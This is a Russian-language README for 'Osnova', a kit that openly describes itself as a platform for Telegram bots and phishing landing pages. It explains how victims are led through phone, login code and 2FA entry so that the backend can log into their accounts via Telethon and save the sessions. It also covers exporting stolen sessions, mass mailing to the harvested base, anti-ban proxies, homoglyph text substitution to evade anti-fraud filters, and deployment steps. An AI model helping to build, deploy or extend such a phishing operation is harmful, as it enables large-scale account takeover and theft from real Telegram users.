# Osnova

Платформа управления Telegram-ботами и фишинг-лендингами. Один **бот-менеджер**
поднимает и обслуживает множество **дочерних ботов**; у каждого — свой мини-апп
(лендинг), сбор сессий Telegram-аккаунтов, привязка доменов с авто-HTTPS и две
веб-панели управления.

Стек: Python 3.11 · aiogram 3 · FastAPI · Telethon · PostgreSQL · Caddy · Docker.

---

## Архитектура одним взглядом

```
Менеджер (bot.py) ──┬── команды владельцев в Telegram (handlers/)
                    ├── дочерние боты (child/) — по одному на каждого бота
                    ├── SSL-watcher доменов (ssl_watcher.py)
                    └── FastAPI (web/) ──┬── мини-апп лендинга   /app/<id>
                                         ├── Bots panel          /panel
                                         ├── Lendings panel       /eva
                                         └── API /api/panel · /auth · /dl
```

Поток жертвы: дочерний бот ловит `/start` → отдаёт кнопку мини-аппа → жертва
открывает лендинг (`/app/<bot_id>`) → проходит шаги телефон → код → 2FA →
бэкенд логинит аккаунт через Telethon и сохраняет сессию → событие падает в
статистику и в LogBot владельца.

## Разделы проекта

### Ядро менеджера

| Файл | За что отвечает |
|------|-----------------|
| `bot.py` | Точка входа. Инициализирует БД, поднимает менеджер-бота, все дочерние боты, SSL-watcher и (опц.) веб-сервер. |
| `config.py` | Чтение настроек из окружения (`.env`): токены, URL панели/мини-аппа, параметры веб-сервера, секреты. |
| `database.py` | Слой БД (PostgreSQL или SQLite-фолбэк). Боты, шаблоны, домены, сессии, статистика, пул CF-токенов, авто-миграции схемы. |
| `keyboards.py` | Инлайн-клавиатуры менеджер-бота. |

### `handlers/` — команды владельца в Telegram

Роутеры aiogram для бота-менеджера (подключаются в `handlers/__init__.py`):

- `start.py`, `ui.py`, `cards.py` — главное меню, карточки ботов, навигация.
- `create_bot.py`, `manage_bots.py`, `cleanup.py` — добавление/удаление/обслуживание дочерних ботов.
- `template.py`, `add_settings.py`, `settings.py` — редактор шаблонов лендинга и настроек бота.
- `domain.py` — привязка пользовательского домена к боту.
- `proxy.py`, `guard.py` — прокси для дочерних ботов и защита от бана (персональные ссылки).
- `broadcast.py`, `token_broadcast.py` — рассылки по собранной базе.
- `statistics.py`, `export_sessions.py` — статистика и выгрузка `.session`-файлов.
- `restart.py`, `admin.py`, `health.py`, `folders.py`, `direct_link.py` — рестарт ботов, админ-функции, healthcheck, папки, модуль «прямой ссылки».

### `child/` — рантайм дочерних ботов

- `runtime.py` — менеджер жизненного цикла: запускает/останавливает дочерние боты, health-петля, реестр запущенных инстансов.
- `runner.py` — логика отдельного бота: `/start`-флоу, кнопка мини-аппа, тексты из шаблона (с **уникализацией**, см. ниже), запись запусков/контактов.

### `web/` — FastAPI + фронтенд

| Файл | Назначение |
|------|------------|
| `app.py` | Сборка FastAPI: мини-апп `/app/<bot_id>`, отдача панелей, монтирование роутеров и модуля прямой ссылки. |
| `panel_api.py` | **API Bots panel** (`/api/panel/*`): боты, черновики, папки, шаблоны, билдер, прокси, домены, админ CF-пул. |
| `auth_api.py` | **API авторизации аккаунта** (`/auth/*`): отправка/проверка кода и 2FA через Telethon — то, что вызывает лендинг. |
| `panel_auth.py` | Валидация Telegram `initData` для доступа к панели. |
| `panel.html` | **Bots panel** — мини-апп управления ботами (вкладки: Боты, Создания, Папки, Логи, Профиль). |
| `eva.html` | **Lendings panel** — мини-апп лендингов (вкладки: Главная, Домены, Сессии, Стат, Профиль). |
| `miniapp.html` | Сам лендинг, который видит жертва (страницы main/code/twofa/success). |
| `launcher.html`, `preview3d.html`, `keypad_preview.html` | Лаунчер модулей и превью. |

### Шаблоны и уникализация

- `miniapp_template.py` — схема контента шаблона: поля страниц (main/code/twofa/success), дефолты, пресеты, цвета и виды оформления.
- `templates.py` — карта имён легаси-шаблонов.
- `uniqualizer.py` — подмена символов на **гомоглифы** для обхода антифрод-фильтров. `uniqualize()` — один текст, `uniqualize_content()` — **весь шаблон за один вызов** (см. ниже).

### Домены и инфраструктура

- `domain_flow.py` — привязка домена: Cloudflare API (зона, NS, DNS) + регистрация в Caddy для авто-HTTPS.
- `cf_pool_loader.py` — пул Cloudflare-токенов (импорт из `cf_pool.json` ↔ БД).
- `ssl_watcher.py` — фоновая проверка живости SSL у доменов; помечает мёртвые и **оживляет** восстановившиеся.
- `proxy_check.py` — валидация прокси.
- `Caddyfile`, `Dockerfile`, `Dockerfile.caddy`, `docker-compose.yml` — прод-инфраструктура на VPS.

### `auth_flow/` и `direct_link/`

- `auth_flow/session_flow.py` — Telethon-флоу логина аккаунта (код, 2FA) и сохранение сессии.
- `direct_link/` — модуль «прямой ссылки»: отдельный мини-флоу авторизации по startapp-ссылке (`/dl/*`), своя storage и интеграция с aiogram.

## Две панели

- **Bots panel** (`/panel`, `web/panel.html`, API `web/panel_api.py`) — управление
  Telegram-ботами: список ботов, создание, папки, логи, профиль.
- **Lendings panel** (`/eva`, `web/eva.html`) — работа с лендингами: домены,
  собранные сессии, статистика (воронка/гео), профиль.

Подробная документация API по обеим панелям — в Swagger-файле `api-docs.yaml`
(генерируется отдельно, в репозиторий не коммитится).

## Уникализация шаблона

Чтобы одинаковые лендинги не палились антифродом, тексты прогоняются через
гомоглифы (`uniqualizer.py`). Включается флагом `uniq_enabled` в контенте
шаблона; параметры — `uniq_ratio` (доля заменяемых символов) и `uniq_mode`
(`hard`/`light`).

- `uniqualize(text)` — один текст.
- `uniqualize_content(content)` — **весь шаблон сразу**: заменяет символы во
  всех текстовых полях страниц (main/code/twofa/success), не трогая эмодзи,
  цвета, URL и HTML-теги. Применяется при отдаче мини-аппа (`web/app.py`).

## Запуск (VPS, Docker)

```bash
git clone https://github.com/meikun1/Osnova-.git osnova && cd osnova
cp .env.docker.example .env   # заполнить MANAGER_BOT_TOKEN, домен, секреты
docker compose up -d --build
```

Caddy сам выпустит HTTPS для домена. Подробности — в `SETUP.md` / `DEPLOY.md`,
привязка доменов — в `DOMAIN_BIND.md`. Деплой по пушу в ветку настроен через
GitHub Actions (`.github/workflows/`).
